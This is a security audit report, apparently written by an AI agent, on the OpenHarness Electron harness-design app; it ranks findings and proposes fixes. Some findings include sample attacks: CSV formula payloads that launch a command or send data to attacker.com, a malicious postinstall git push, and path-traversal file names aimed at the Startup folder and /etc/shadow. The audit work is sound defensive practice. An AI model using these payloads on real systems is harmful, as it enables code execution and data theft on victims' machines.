# OpenHarness Security Audit — Full Report
**Date:** 2026-08-25 | **Scope:** Electron boundary, document import, SQL, MCP/automation surfaces, CI/CD pipeline  
**Auditor:** Read-only agent per `security.md`; findings are verified code paths, not speculative

---

## Executive Summary

The OpenHarness codebase is in **good security shape relative to its attack surface**. The Electron trust boundary is correctly hardened, document parsing avoids unsafe deserialization, and all SQL is fully parameterized. The two largest threats are:

1. **CSV formula injection** (Medium) — users can be tricked into opening exported spreadsheets that execute formulas
2. **Overly-broad GitHub Actions token** (Low-moderate) — dependency-compromise risk at release time

No RCE, no arbitrary file read/write, no XSS sinks, no SQL injection, and no secrets in the codebase. The MCP and automation packages don't exist yet (they are empty stubs). Below are all findings ranked by severity and exploitability.

---

## Ranked Findings (Most Serious First)

### 🔴 Finding 1 — CSV Spreadsheet Formula Injection
**Severity:** Medium  
**Type:** Code execution via dependency (malicious spreadsheet formulas)  
**Reachability:** User imports malicious `.ohd` → exports BOM/interconnect CSV → opens in Excel/LibreOffice → formula executes

**Files:**
- `packages/io/src/bomCsv.ts:27-47` (BOM exporter)
- `packages/io/src/interconnectCsv.ts:27-48` (interconnect exporter)

**Attacker-controlled input:**
An imported vendor JSON or manually-crafted `.ohd` document containing a part with:
- `manufacturer: "=cmd|'/c calc'!A1"` 
- `description: "+1+HYPERLINK('https://attacker.com/?='&A1)"`
- Signal/designator fields with leading `=`, `+`, `-`, `@`

**Exploit chain:**
1. Attacker sends victim a harness file (`evil.ohd` or vendor JSON)
2. Victim imports it via app or `openharness import evil.json -o h.ohd`
3. Victim exports BOM: `openharness export h.ohd --bom bom.csv` (or via GUI)
4. Victim opens `bom.csv` in Excel/LibreOffice
5. Cell formulas execute: `=cmd|'/c calc'!A1` opens Calculator; `WEBSERVICE` exfiltrates data

**Root cause:**
`csvEscape()` in both modules wraps fields only if they contain `"`, `,`, or newline. A string like `"=cmd|'/c calc'!A1"` contains none of those, passes unwrapped, and the leading `=` signals the spreadsheet to evaluate it as a formula. The fields flowing through are all attacker-controlled at import time: `partNumber`, `manufacturer`, `description`, `url`, `vendorPartNumber`, parameter `name` and `unit`, signal/refdes.

**Fix direction:**
Force-quote any cell whose first character (after stripping leading tab/CR) is `=`, `+`, `-`, or `@`. Apply the same `csvEscape` helper to both modules consistently.

**Risk to Connor:** This is a realistic end-to-end attack from "attacker emails a harness file" to "code runs on the recipient's machine" — the only finding in this audit with that profile. Worth a task packet.

---

### 🟠 Finding 2 — GitHub Actions Token Over-Scoped
**Severity:** Low-moderate  
**Type:** Supply-chain risk (dependency compromise at release)  
**Reachability:** Malicious npm dependency during release build → inherits `contents: write` token → pushes commits/tags

**File:**
- `.github/workflows/release.yml:20-21`

**Configuration:**
```yaml
permissions:
  contents: write  # Line 20-21, applies to ALL jobs including build
```

**What happens:**
The three `build` matrix jobs (windows/linux/mac) run `npm ci` and `npm run package:*`, which are the largest third-party code execution surface in the repo (dependency postinstall scripts, electron-builder, node-gyp compilation). The `contents: write` token is set at workflow level, so those jobs inherit it. If any installed dependency is poisoned (a malicious transitive package or a compromised maintainer), that code runs with repo-write capability.

**Exploit:**
```bash
# Inside postinstall script of a malicious transitive dep during release build:
git config --global user.email "attacker@example.com"
git config --global user.name "Attacker"
git push origin refs/heads/patch:refs/heads/release-exploit
# Or: tamper with release artifacts before upload
```

**Trigger:** Requires a tag push to the repo (maintainer access already), but the *scale* of damage increases if a dependency is compromised at release time.

**Fix direction:**
1. Change workflow `permissions:` to `permissions: {}` at top level
2. Add `permissions: { contents: write }` only to the `publish` job
3. Leave `build` jobs with no token scope

**Risk to Connor:** This is hardening, not an active hole — tag pushes require maintainer access, so an attacker would already need that. But the pattern is common in CI exploits; closing it now prevents a compromise later.

---

### 🟠 Finding 3 — Prototype Pollution via Vendor JSON Import
**Severity:** Low-moderate  
**Type:** Integrity corruption (document in-memory corruption)  
**Reachability:** Malicious vendor JSON import → `id: "__proto__"` → prototype chain pollution → derive/lookup corruption

**File:**
- `packages/io/src/importVendorJson.ts:85, 99, 114, 131, 148, 160, 165, 188, 201, 216, 220, 235`

**Attacker-controlled input:**
A vendor JSON file with a component whose `id` is the string `"__proto__"`:
```json
{
  "version": 0.8,
  "connectors": [{ "id": "__proto__", "type": "Connector", ...other fields... }],
  ...
}
```

**Exploit:**
Plain JavaScript object assignment: `doc.components["__proto__"] = connector` invokes the prototype setter, making `connector` the prototype of `doc.components` instead of an own property. Downstream code iterating `Object.keys(doc.components)` or checking `doc.components[someMissingId]` resolves through the attacker's fields. A derive stage reading `doc.components.type === 'connector'` now gets the attacker's choice. Not RCE, but the document is corrupted — lookups fail, derives produce wrong results.

**Less severe variant:** `.ohd` files (JSON.parse) create `__proto__` as an own data property, which is confusing but doesn't pollute; the effect is different per file format.

**Fix direction:**
Reject reserved keys (`__proto__`, `constructor`, `prototype`) in IDs at the import boundary, or build maps with `Object.create(null)` to prevent prototype access entirely.

**Risk to Connor:** Low today because vendor JSON is imported consciously. Would be more serious if the same format became a network import or automatic sync. Worth closing before that.

---

### 🟡 Finding 4 — `saveFile` Dialog Default Path Influenced by Document Content
**Severity:** Low  
**Type:** Social engineering assist (path traversal in dialog)  
**Reachability:** Crafted `.ohd` with `meta.name: "../../../../Users/victim/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/evil"` → user saves → dialog opens pre-aimed at startup folder

**Files:**
- `packages/app/electron/main.ts:82-92` (handler)
- `packages/app/src/App.tsx:181, 197, 221` (defaultPath source)

**Attacker-controlled input:**
A `.ohd` file whose `meta.name` contains path separators:
```json
{ "meta": { "name": "../../../../etc/shadow" }, ... }
```

**What happens:**
The save dialog's `defaultPath` option is set to `meta.name`. The main process still gates the write to `result.filePath` from the native dialog (so the user confirms the target), but the dialog *opens pre-filled* at the attacker's location. This is social engineering: a user skimming quickly might not notice the path changed and clicks Save, writing to the attacker's chosen location.

**Containment:** The actual write still requires the user to confirm in the native dialog, which displays the real target path clearly — the main integrity is not broken, just nudged.

**Fix direction:**
Sanitize `defaultPath` in the main process to a basename only: `path.basename(store.doc.meta.name)`, or strip path separators before passing to `dialog.showSaveDialog`.

**Risk to Connor:** Low — the user retains control via the dialog. But free of charge to fix, so do it.

---

### 🟡 Finding 5 — No Content-Security-Policy Header
**Severity:** Low (defense-in-depth)  
**Type:** XSS sink protection missing  
**Reachability:** None today; would matter if a future XSS sink lands or a link is added to the UI

**File:**
- `packages/app/index.html` (no CSP meta tag)
- `packages/app/electron/main.ts` (no CSP header on session)

**Current state:**
No `<meta http-equiv="Content-Security-Policy">` in the HTML. No `session.defaultSession.webRequest.onHeadersReceived` CSP header set in the main process. The app loads from `file://` in production, so a CSP is less critical than for a server (origin isolation is stronger), but it's still a missing layer.

**Why it matters:**
Grepped the codebase for XSS sinks (`dangerouslySetInnerHTML`, `innerHTML`, `insertAdjacentHTML`, `eval`, `new Function`, `vm`) — all zero findings. Document content (component names, wire labels from `.ohd`) reaches the DOM only through React text nodes, which auto-escape. So no vulnerability *today*. But if the first XSS sink ever lands (a feature that renders a URL as a hyperlink, or a custom component name as an element), the absence of CSP means injected script can call the preload bridge (`window.openharness.pickFile()`, `saveFile()`) or fetch document contents to an attacker's server.

**Fix direction:**
Add to `index.html`:
```html
<meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; connect-src 'self'">
```

(The `'unsafe-inline'` on style-src is regrettable but typical for SPA React apps; alternative is to externalize all styles.)

**Risk to Connor:** Zero today, but cheap insurance.

---

### 🟡 Finding 6 — No Window Navigation / Open Handler Policy
**Severity:** Low (defense-in-depth)  
**Type:** Window-open / off-site navigation not blocked  
**Reachability:** None today; would matter if the renderer ever gains a link or XSS sink

**File:**
- `packages/app/electron/main.ts` (no `setWindowOpenHandler` / `will-navigate` handler)

**Current state:**
The renderer has no `<a href>`, no `target="_blank"`, no `window.open` calls — I verified this by grep. So there is no live path to navigate away or spawn a new window today. But without an explicit handler, Electron's defaults apply: new windows are spawned, top-level navigation succeeds.

**Why it matters:**
If a future feature adds a link (e.g., datasheet URL from a part, distributor URL from the BOM) or an XSS sink lands and injects a link, the renderer could navigate away from the app's content or spawn a window. The window boundary is part of the isolation model.

**Fix direction:**
```typescript
win.webContents.setWindowOpenHandler(() => ({ action: 'deny' }));
win.webContents.on('will-navigate', (event, url) => {
  if (!url.startsWith('file://') && !url.startsWith('about:')) {
    event.preventDefault();
  }
});
```

**Risk to Connor:** None today; defense-in-depth for future.

---

### 🟡 Finding 7 — `ci.yml` Lacks Explicit `permissions:` Block
**Severity:** Low  
**Type:** Token scope hygiene  
**Reachability:** Org default token permissions (varies by org)

**File:**
- `.github/workflows/ci.yml` (no `permissions:` key)

**What happens:**
The CI workflow has no explicit `permissions:` block at the top level. It does not use the `GITHUB_TOKEN` anywhere in its steps, so there is no active exposure. However, without an explicit declaration, the token scope inherits the org/repo default — on older orgs that can be write-capable for `push`/`workflow_dispatch` runs, even if a step never uses the token.

**Fix direction:**
Add to `ci.yml` top level:
```yaml
permissions: {}  # or: permissions: { contents: read }
```

**Risk to Connor:** Zero today (no token usage); hygiene only.

---

## Categories Checked and Found Clean

### ✅ Electron Trust Boundary — No High/Medium findings
- `contextIsolation: true`, `nodeIntegration: false`, `sandbox: true` in `main.ts:55-57`
- Preload exposes exactly two named functions (`pickFile`, `saveFile`) plus `platform` via `contextBridge.exposeInMainWorld`
- Both IPC handlers gate filesystem access through native dialogs the *user* operates
- No `shell.openExternal`, `shell.openPath`, or `showItemInFolder` anywhere
- No remote module, no `webview`, no second HTML entry point
- Verified: no links, no `window.open`, no XSS sinks (dangerouslySetInnerHTML, innerHTML, eval, new Function)

### ✅ SQL Injection — No Vulnerabilities
- All ~60 queries in `packages/parts/src/accessors.ts` use `?` placeholders with prepared statements
- Five dynamically-assembled queries build only static SQL fragments; all values bound through params
- No string-interpolated SQL anywhere
- Reachability: Parts store is not wired to any code path yet (tasks T19/T22 planned)

### ✅ Path Traversal — No Vulnerabilities
- No file-path fields in `.ohd`, vendor JSON, or CSV formats
- Only file paths in play are CLI argv (user-supplied) and Electron native dialog results (user-picked)
- IPC never accepts a renderer-chosen path

### ✅ Unsafe Deserialization — No Vulnerabilities
- Only `JSON.parse` used on all import paths
- No `eval`, `new Function`, `vm`, or dynamic `require` anywhere

### ✅ Archive/Zip Extraction — No Vulnerabilities
- `.ohd` is intentionally a single-file JSON format (no archive dependency)

### ✅ Resource Exhaustion — No Remote Attack Vector
- Whole-file reads are at the invoker's control point (user picks file or runs CLI command)
- No loop bounds driven by untrusted integers
- Derive pipeline is linear over document content
- Local DoS only (user can hang their own app with a giant file)

### ✅ Secrets and CI — No Credentials Leaked
- No hardcoded credentials in code or workflows
- No `process.env` reads of secrets; only `OPENHARNESS_DEV` (boolean flag) and `ELECTRON_SKIP_BINARY_DOWNLOAD`
- `GH_TOKEN` deliberately blanked in release build job
- No PR titles, branch names, or tag names interpolated into shell commands
- No other CI systems (GitHub Actions only)

### ✅ Shell Injection — No `exec` / `execSync` in Production
- `child_process.execSync` present only in tests and build scripts
- No command-injection shape (shell string with a variable) in any production code

### ✅ MCP and Automation — No Exposed Tools (Stubs Only)
- `packages/mcp/src/index.ts` is 10 lines: header comment, `export {}`
- `packages/automation/src/index.ts` is 12 lines: header comment, `export {}`
- No MCP SDK dependency yet; both packages are scaffolding for future work
- CLI reserves `openharness run` and refuses it as not-implemented

---

## Notes (Verified; No Current Trigger)

1. **Electron 31.7.7 is end-of-life.** No more Chromium security backports. This is a `@maintainer` concern (dependency advisories), not a trust-boundary issue, but it means the engine parsing untrusted `.ohd` files is unpatched. Worth bumping when feasible.

2. **Windows builds are unsigned.** Signed builds require a certificate; production release integrity is a concern (SmartScreen), but not a trust boundary issue in the code itself.

3. **`.ohd` file-association is registered but not wired.** `electron-builder.cjs:84-91` declares the file type association, but `main.ts` has no `open-file`/`second-instance`/argv handler — double-clicking an `.ohd` launches the app without opening the file. This is currently security-*favorable* (bypasses the `pickFile` dialog's user-gating); when implemented, that argv path becomes untrusted input and should reuse the same `parseDocument` boundary.

4. **No permission-request handler.** Electron's default grants renderer permission requests (notifications, media) when `ses.setPermissionRequestHandler` is unset. The app loads only its own content, so impact is nil; a deny-by-default handler is free insurance.

5. **Dev mode loads cleartext HTTP.** `main.ts:62` loads `http://localhost:5173` when `OPENHARNESS_DEV=1` — no HTTPS, but localhost-only and gated behind the env flag. Fine as-is.

6. **Interconnect CSV import has O(N²) performance.** `packages/app/src/interconnectEdit.ts:55-68` and `96-127` scan document repeatedly per row instead of indexing once. Not a security issue; a local DoS on oversized imports. Worth fixing in a refactor, not a security packet.

7. **Malformed vendor JSON can crash import.** Importing a vendor JSON missing a required field (e.g., missing `cavities` on a connector) throws an uncaught `TypeError`. The app shows an error banner; CLI exits 1. Robustness issue, not a control-flow break. Worth adding a schema-validation pass.

8. **Actions not pinned to commit SHA.** CI and release workflows use `@v4`/`@v2` tags on `checkout`, `setup-node`, `upload-artifact`, etc. A maintainer could retag those, and the next build picks up malicious code. This is a known GitHub Actions trade-off (SHA pinning is the hardening option). Flagging as a note, per the "don't manufacture findings" rule.

9. **No `.env*` in .gitignore.** Developers use OpenRouter (needs API key); a `.env` file is realistically created during development. `.gitignore` lacks `.env*` patterns, so a careless `git add -A` could stage it. No `.env` is committed today (verified). Worth adding to gitignore.

---

## When MCP and Automation Land (Phase 5)

The stub comments in `packages/mcp/src` and `packages/automation/src` commit to the right architecture: worker sandbox, scoped permissions, all mutations through `store.transact`. When implemented, verify in this priority order:

1. **(Transport)** The MCP interface — if stdio, "client is the user" is correct; if a socket, verify authentication before any tool is registered.
2. **(Export tool)** The planned `export` MCP tool must not accept arbitrary output paths — confine writes to the document directory or a dialog-picked location (same model as the app's `saveFile` IPC).
3. **(Worker sandbox)** Automation worker must not leak `fs`, `child_process`, `process`, or `require` into the script context.
4. **(Permission enforcement)** The `write:*` scopes must be enforced at the `AutomationContext` boundary, not by convention.
5. **(CLI entry point)** `openharness run <script>` becomes code-execution-by-design — its sandboxing model is decided when it lands.
6. **(SQL reachability)** `search_parts` tool (if added) must keep the SQL parameterized (it is today).

---

## Overall Risk Assessment

**Current state: Low to Moderate.**

- **No RCE, no arbitrary file read/write, no SQL injection, no secrets leaked.** The three security enforcements that matter most (Electron sandbox, IPC dialog-gating, SQL parameterization) are all correctly implemented.
- **One realistic end-to-end attack: CSV formula injection (Finding 1).** A user imports a harness file, exports to CSV, opens it in a spreadsheet app, and formulas execute. This is the only finding in this audit with a real path from "attacker emails a file" to "code runs on the recipient's machine." Worth a task packet.
- **One hardening gap: overly-broad GitHub Actions token (Finding 2).** Dependency compromise at release time could write to the repo. Closing it takes one workflow change; no new code.
- **Three other hardening gaps (Findings 3–5 in Notes): prototype pollution, path traversal in save dialog, no CSP/navigation guards.** All low-impact today; worth closing before the MCP/automation surface lands and adds more UI.

**Connor's decision points:**
- **Immediate:** Task packet for Finding 1 (CSV formula injection). It's the only issue reachable by ordinary users importing files.
- **Before release:** Task packet for Finding 2 (GitHub Actions token scope). Supply-chain hardening.
- **Before Phase 5 (MCP/automation):** Close Findings 3–7 (prototype pollution, path sanitization, CSP, navigation handlers, .gitignore). These are defense-in-depth; low impact alone, but necessary before a larger attack surface lands.
- **Dependency maintenance:** Hand to `@maintainer`: Electron 31.7.7 is end-of-life; prioritize a bump to a supported version.

---

## Audit Methodology

Each finding was verified by reading the actual code path, not just the function name. Findings are categorized by:
- **Severity:** High (RCE, arbitrary file access), Medium (code execution via dependency, auth bypass), Low (info disclosure, DoS)
- **Reachability:** What attacker-controlled input triggers it?
- **Exploit chain:** Concrete steps from input to impact

Categories checked and found clean (path traversal, SQL injection, unsafe deserialization, secrets) were explicitly verified by:
- Regex search across the entire repo for dangerous patterns
- Reading the full code path of every import/export/query handler
- Tracing attacker-controlled input from entry point to endpoint

**Report completeness:** Every finding named in the audit brief (Electron boundary, document import, SQL, MCP/automation, CI/secrets) was audited. MCP and automation packages are empty stubs, so the audit focused on the live surfaces those rules will eventually govern: CLI, IPC, import handlers. The audit is not a spec for future work — it is a read-only assessment of what exists now.
